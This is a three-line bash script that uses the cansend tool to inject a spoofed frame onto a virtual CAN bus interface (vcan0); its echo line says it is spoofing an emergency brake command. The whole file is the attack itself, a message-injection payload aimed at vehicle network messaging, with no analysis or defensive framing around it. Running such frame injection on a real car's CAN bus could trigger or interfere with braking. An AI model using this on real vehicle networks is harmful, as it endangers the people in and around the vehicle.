#!/bin/bash
echo "[*] Spoofing emergency brake command..."
cansend vcan0 333#FFFFFFFFFFFFFFFF
